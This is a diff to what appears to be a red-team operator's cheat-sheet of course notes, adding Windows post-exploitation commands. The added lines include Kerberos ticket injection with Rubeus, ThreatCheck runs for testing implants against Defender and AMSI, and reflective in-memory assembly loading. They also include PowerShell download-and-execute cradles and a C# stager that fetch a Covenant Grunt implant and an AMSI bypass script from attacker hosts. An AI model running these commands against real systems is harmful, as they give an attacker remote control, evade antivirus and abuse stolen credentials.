@@ -264,7 +264,7 @@ Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 
 Credential Cache
 Linux
- MakeToken a.mitchell cyberbotic.io DoesNotMatter
+MakeToken a.mitchell cyberbotic.io DoesNotMatter
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\User\Desktop\amitchell.kirbi"))
 Rubeus ptt /ticket:doIF[...snip...]Tw==
 
@@ -449,14 +449,46 @@ MakeToken Administrator . MVYZKwfr356v3M
 #Windows Defender Antivirus & AMSI
 ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntHTTP.exe -e Defender
 
+#Reflection
+PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
+PS > $dllstring = [System.Convert]::ToBase64String($dll)
+PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dllstring))
+PS > [ReflectionDemo.DemoClass]::PrintStuff()
+Hello World
 
+whiout disk
+$grunt = (new-object net.webclient).downloaddata("http://10.8.0.6/http-grunt.exe")
+[System.Reflection.Assembly]::Load($grunt)
 
+#Antimalware Scan Interface (AMSI)
 
+iex (new-object net.webclient).downloadstring("http://x.x.x.x/bypass.ps1"); iex (new-object net.webclient).downloadstring("http://x.x.x.x/payload.ps1")
+$bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
+[System.Reflection.Assembly]::Load($bytes)
+class Program
+{
+  static void Main(string[] args)
+  {
+    var client = new WebClient();
+    var gruntStager = client.DownloadData("http://10.8.0.6/GruntHTTPStager.exe");
+    client.Dispose();
 
+    // bypass code here
 
+    var asm = Assembly.Load(gruntStager);
+    var type = asm.GetType("GruntStager.GruntStager");
+    var instance = Activator.CreateInstance(type);
+    type.InvokeMember("GruntStager", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
+  }
+}
 
+#ThreatCheck (In-Memory)
+ThreatCheck.exe -f C:\Users\Rasta\source\repos\GruntStager\bin\Debug\GruntStager.exe
+ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntExecutor.bin -e AMSI
 
-
+#AppLocker
+Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
+rundll32.exe
 
 
 
